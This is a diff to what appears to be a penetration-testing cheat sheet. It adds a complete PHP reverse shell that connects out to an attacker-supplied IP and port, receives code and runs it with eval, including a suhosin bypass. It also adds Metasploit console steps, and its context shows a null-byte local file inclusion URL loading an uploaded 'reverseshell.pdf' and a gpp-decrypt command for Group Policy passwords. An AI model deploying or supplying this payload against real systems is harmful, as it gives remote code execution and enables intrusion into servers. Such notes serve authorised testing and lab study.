@@ -807,6 +807,11 @@ In Browser:
 
 http://10.0.2.8/index.php?page=uploads/reverseshell.pdf%00
 
+*php reverse shell*
+
+    /*<?php /**/ error_reporting(0); $ip = 'PUT YOUR IP'; $port = PUT YOUR PORT; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
+
+
 *Privilage Escalation*
 
 find a folder with full rights -> tmp
@@ -1300,6 +1305,16 @@ Decrypt Grouppolicy password
     gpp-decrypt <pw>
 
 *Exploitation*
+
+*Metasploit*
+
+    msfconsole
+    search <term>
+    use <path>
+    show options
+    show targets
+    set target <id>
+    exploit
 
 Get impacket https://github.com/GammaG/impacket and intall via
 
